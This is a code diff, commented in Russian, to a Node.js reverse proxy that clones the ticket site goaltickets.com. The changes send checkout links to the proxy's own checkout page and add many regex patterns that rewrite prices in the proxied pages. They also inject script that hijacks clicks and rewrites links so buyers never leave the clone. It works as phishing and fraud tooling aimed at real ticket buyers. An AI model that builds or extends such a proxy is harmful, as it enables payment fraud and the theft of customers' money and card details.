@@ -54,11 +54,30 @@ app.get('*checkout*', (req, res) => {
   res.sendFile(__dirname + '/checkout.html');
 });
 
-// Перехватываем внешние ссылки на checkout
-app.get('/checkouts/*', (req, res) => {
-  console.log('🎯 External checkout intercepted:', req.url);
-  res.sendFile(__dirname + '/checkout.html');
-});
+    // Перехватываем внешние ссылки на checkout
+    app.get('/checkouts/*', (req, res) => {
+      console.log('🎯 External checkout intercepted:', req.url);
+      res.sendFile(__dirname + '/checkout.html');
+    });
+
+    // Перехватываем все страницы событий
+    app.get('/products/*', (req, res, next) => {
+      console.log('🎯 Product page intercepted:', req.url);
+      // Проксируем к оригинальному сайту, но с нашими модификациями
+      next();
+    });
+
+    app.get('/collections/*', (req, res, next) => {
+      console.log('🎯 Collection page intercepted:', req.url);
+      // Проксируем к оригинальному сайту, но с нашими модификациями
+      next();
+    });
+
+    app.get('/events/*', (req, res, next) => {
+      console.log('🎯 Event page intercepted:', req.url);
+      // Проксируем к оригинальному сайту, но с нашими модификациями
+      next();
+    });
 
 // Обработка POST запросов (возвращаем 200 для избежания ошибок)
 app.post('/api/*', (req, res) => {
@@ -165,7 +184,30 @@ const proxyOptions = {
           // Цены в JSON
           /"price":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
           // Цены в span с классом price
-          /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g
+          /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g,
+          // Цены в div с классом price
+          /<div[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/div>/g,
+          // Цены в p с классом price
+          /<p[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/p>/g,
+          // Цены в strong с классом price
+          /<strong[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/strong>/g,
+          // Цены в h1-h6 с классом price
+          /<h[1-6][^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/h[1-6]>/g,
+          // Цены в любом элементе с классом содержащим price
+          /<[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/[^>]*>/g,
+          // Цены в data атрибутах с разными именами
+          /data-amount="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
+          /data-cost="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
+          /data-value="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
+          // Цены в JSON с разными ключами
+          /"amount":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          /"cost":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          /"value":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
+          // Цены в тексте без символа доллара
+          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g,
+          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g,
+          // Цены в формате "900.00 /ticket"
+          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g
         ];
         
         pricePatterns.forEach(pattern => {
@@ -304,6 +346,62 @@ const proxyOptions = {
               setTimeout(interceptAllCheckoutLinks, 1000);
               setTimeout(interceptAllCheckoutLinks, 3000);
               
+              // 🎯 ПЕРЕХВАТ ВСЕХ ССЫЛОК НА СОБЫТИЯ
+              function interceptEventLinks() {
+                console.log('🔗 Intercepting event links...');
+                
+                // Перехватываем все ссылки на события
+                document.addEventListener('click', function(event) {
+                  const target = event.target;
+                  const href = target.href || target.closest('a')?.href;
+                  
+                  if (href) {
+                    // Если ссылка ведет на goaltickets.com
+                    if (href.includes('goaltickets.com')) {
+                      console.log('🔗 Event link intercepted:', href);
+                      event.preventDefault();
+                      event.stopPropagation();
+                      
+                      // Извлекаем путь после домена
+                      const url = new URL(href);
+                      const path = url.pathname + url.search + url.hash;
+                      
+                      // Перенаправляем на наш прокси
+                      window.location.href = path;
+                      return false;
+                    }
+                    
+                    // Если ссылка ведет на события (products, collections)
+                    if (href.includes('/products/') || href.includes('/collections/') || 
+                        href.includes('/events/') || href.includes('/tickets/')) {
+                      console.log('🔗 Event page link intercepted:', href);
+                      event.preventDefault();
+                      event.stopPropagation();
+                      
+                      // Перенаправляем на наш прокси
+                      window.location.href = href;
+                      return false;
+                    }
+                  }
+                });
+                
+                // Также перехватываем все ссылки при загрузке страницы
+                const allLinks = document.querySelectorAll('a[href]');
+                allLinks.forEach(link => {
+                  const href = link.href;
+                  
+                  if (href.includes('goaltickets.com')) {
+                    // Извлекаем путь после домена
+                    const url = new URL(href);
+                    const path = url.pathname + url.search + url.hash;
+                    
+                    // Обновляем href на наш прокси
+                    link.href = path;
+                    console.log('🔗 Link updated:', href, '->', path);
+                  }
+                });
+              }
+              
               // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
               function modifyPricesOnPage() {
                 console.log('💰 Modifying prices on page...');
@@ -362,6 +460,11 @@ const proxyOptions = {
                   }
                 });
               }
+              
+              // Запускаем перехват ссылок
+              setTimeout(interceptEventLinks, 100);
+              setTimeout(interceptEventLinks, 1000);
+              setTimeout(interceptEventLinks, 3000);
               
               // Запускаем изменение цен
               setTimeout(modifyPricesOnPage, 500);
